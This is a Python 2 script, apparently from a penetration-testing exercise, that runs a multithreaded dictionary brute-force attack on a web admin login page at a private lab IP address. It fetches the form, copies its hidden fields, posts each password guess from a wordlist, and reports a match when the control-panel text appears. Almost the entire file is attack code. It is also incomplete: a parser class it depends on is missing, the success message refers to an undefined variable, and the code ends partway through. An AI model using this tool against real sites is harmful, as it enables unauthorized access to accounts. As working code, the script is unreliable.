import urllib
import urllib2
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

user_thread = 10
user_name = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print "Finished setting up for: %s" % username

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookie")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] waiting for other threads to exit..."